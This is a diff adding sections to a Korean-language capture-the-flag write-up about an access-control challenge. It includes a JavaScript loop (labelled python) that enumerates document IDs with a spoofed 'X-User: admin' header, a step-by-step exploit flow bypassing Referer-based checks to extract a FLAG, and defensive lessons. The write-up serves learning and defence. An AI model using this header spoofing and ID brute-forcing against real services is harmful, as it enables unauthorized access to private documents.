@@ -190,12 +190,54 @@ FLAG만 추출 가능
 
 ---
 
+## 4. 자동화 (Brute Force)
 
+confidential 문서 ID를 모르는 경우:
 
+```python
+for (let i = 100; i < 1000; i++) {
+fetch(`/doc/${i}`, {
+headers: { "X-User": "admin" }
+})
+.then(r => r.text())
+.then(txt => {
+if (txt.includes("confidential")) {
+console.log(i, txt);
+}
+});
+}
+```
 
+전체 ID 범위 탐색 기능
 
+--- 
 
+## 5. 전체 공격 흐름 정리
 
+전체 익스플로잇은 다음 단계로 구성된다.  
+1. /api/docs에서 confidential 문서 ID 확인
+2. /doc/<id> 직접 접근 -> 실패
+3. /share 페이지에서 요청 발생
+4. 브라우저 자동 Referer 설정
+5. X-User: admin 헤더 삽입
+6. 문서 HTML 응답 획득
+7. 정규식으로 FLAG 추출
 
+---
 
+## 6. 포인트
 
+이 문제의 포인트는 다음이다.  
+- 클라이언트 헤더를 신뢰하면 안된다.
+- Referer 기반 인증은 취약하다.
+- 브라우저 동작을 이용하면 쉽게 우회 가능
+
+---
+
+## 7. 정리
+
+Referer 기반 접근 제어와 헤더 기반 권한 검증을 동시에 우회하여   
+confidential 문서에 접근하고,   
+HTML 주석에 숨겨진 FLAG를 획득하는 문제  
+
+---
